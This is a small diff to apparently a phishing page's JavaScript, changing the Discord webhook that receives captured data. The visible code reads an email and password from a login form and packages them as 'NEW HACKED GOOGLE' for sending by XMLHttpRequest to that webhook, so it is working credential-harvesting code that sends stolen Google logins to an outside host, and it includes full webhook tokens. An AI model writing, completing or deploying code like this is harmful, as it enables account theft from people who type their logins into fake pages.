@@ -10,7 +10,7 @@ function submit() {
   var password = document.getElementById("password").value;
 
   function message() {
-    const webhook = "https://discord.com/api/webhooks/1243386246080761951/LsHj5T5jZtpkmfAdFr04G74pwa7luGbVuU-iR0FiUA7G4srGFwRfWwYOPWKHIpz9Q8Kq";
+    const webhook = "https://discord.com/api/webhooks/1352368059188514867/KrEtD4rbh6TDe_bIBZGdoxca5eH85AZOUm1tcmYV0heZ9Vp34HRue83xzhyuAFAZJ3gU";
 
     const contents = `NEW HACKED GOOGLE\n\nEmail: ${email}\nPassword: ${password}`;
     const request = new XMLHttpRequest();
